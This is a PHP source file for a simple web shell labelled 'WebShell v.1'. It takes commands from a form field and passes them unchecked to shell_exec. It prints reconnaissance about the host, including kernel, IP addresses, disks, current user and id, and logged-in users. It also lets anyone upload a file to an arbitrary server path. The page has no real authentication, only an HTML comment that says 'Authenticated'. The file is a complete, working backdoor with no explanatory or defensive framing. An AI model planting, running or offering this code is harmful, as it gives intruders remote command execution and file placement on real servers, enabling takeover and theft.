<?php
echo '<body style="background-color:#424242;">';
?>


<!-- Authenticated -->
<font style="float:left;" color="#F1F1F1"><b>WebShell v.1</b></font><br /><br />

<fieldset style="border:2px solid #ffffff;opacity:0.5;border-radius:5px;background:#1867Ad;">
<form style="float:left;color:#ffffff;" action='<?php echo $_SERVER["PHP_SELF"]?>' method="post">
<b>Run Command:</b><br />
<input type= "text" name="command" />
<input type="submit" value="Make it so!"/><p>

<b>System Info:</b><p>
------------------------------------------------------------------------------------------------------------
<?php
$uname = shell_exec('uname -a');
echo "<pre>$uname</pre>";
?>

<?php
$ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
echo "<pre>$ip_addr</pre>";
?>

<?php
$disk = shell_exec("df -h");
echo "<pre>$disk</pre>";
?>

<?php
$user = shell_exec("whoami; id");
echo "<pre>$user</pre>";
?>

<?php
$users = shell_exec("who -u");
echo "<pre>$users</pre>";
?>

</form>

<form style="float:right;color:#ffffff;"action="" method="POST" enctype="multipart/form-data">
<b>Remote Upload Path:</b><br />
<input type="text" name="upload" /> (Use full paths)<br /><br />
<b>File Upload:</b><br />
<input type="submit" value="Upload!"/>
<input type="file" name="file" /><P>
<b>Current Remote Directory:</b><br />
----------------------------------------------------------
<?php
$pwd = shell_exec("pwd");
echo "<pre>$pwd</pre>";
?>

</form></fieldset>

<?php 
   if(isset($_FILES['file'])){
      $errors= array();
      $file_name = $_FILES['file']['name'];
      $file_size =$_FILES['file']['size'];
      $file_tmp =$_FILES['file']['tmp_name'];
      $file_type=$_FILES['file']['type'];   
      $file_ext=strtolower(end(explode('.',$_FILES['file']['name'])));
               
      if(empty($errors)==true){
         move_uploaded_file($file_tmp,$_POST['upload'].$file_name);
         echo '<pre><span style="font-size: 11px; color: #FFFFFF;">';
         echo 'Upload: ' . $_FILES['file']['name'] . '<br />';
         echo 'Size: ' . ($_FILES['file']['size'] / 1024) . ' Kb<br />';
         echo 'Stored in: ' . $_POST['upload'];
         echo '</span></pre>';
      }else{
         print_r($errors);
      }
   }
   function exec_cmd(){
      if (isset($_POST['command'])){
         $exc = $_POST['command']; echo shell_exec($exc);
      }
   }
   echo '<pre><span style="font-size:11px;color:#F2F2F2;">';
   exec_cmd();
   echo '</span></pre>';
?>
